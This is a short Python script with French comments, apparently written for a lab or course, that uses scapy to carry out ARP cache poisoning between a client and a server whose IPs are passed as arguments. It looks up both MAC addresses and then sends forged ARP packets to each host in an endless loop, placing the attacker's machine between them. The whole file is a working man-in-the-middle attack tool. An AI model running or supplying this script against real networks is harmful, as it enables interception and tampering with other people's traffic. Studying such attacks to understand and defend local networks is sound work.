#!/usr/bin/env python3

# apt update
# apt install python3-pip
# pip3 install scapy

import sys, time
from scapy.all import *

# Vérifie si le nombre d'arguments est correct
if len(sys.argv) != 3:
    print("Erreur argument manquant ! ! !\n Les arguments doivent être de la façon suivante :\n ./attaque.py (@ip-client) (@ip-serveur)")
    exit()

# Arguments nécessaires pour attaquer le client et le serveur
ip_client = sys.argv[1]
ip_serveur = sys.argv[2]

# Récupération de l'adresse MAC du client
requete = Ether() / ARP(pdst=ip_client)
reponse = srp1(requete, timeout=2)

# Quand l'IP du client est inaccessible
if reponse is None:
    print("Le client est inaccessible")
    exit()

mac_client = reponse[ARP].hwsrc

# Récupération de l'adresse MAC du serveur
requete2 = Ether() / ARP(pdst=ip_serveur)
reponse2 = srp1(requete2, timeout=2)

# Quand l'IP du serveur est inaccessible
if reponse2 is None:
    print("Le serveur est inaccessible")
    exit()

mac_serveur = reponse2[ARP].hwsrc

# Création du paquet pour attaquer le client
attaque_client = Ether(dst=mac_client) / ARP(psrc=ip_serveur)

# Création du paquet pour attaquer le serveur
attaque_serveur = Ether(dst=mac_serveur) / ARP(psrc=ip_client)

# Boucle permettant d'envoyer les paquets empoisonnés pendant un intervalle de 2 secondes
while True:    
    sendp(attaque_client)
    sendp(attaque_serveur)
    time.sleep(1)
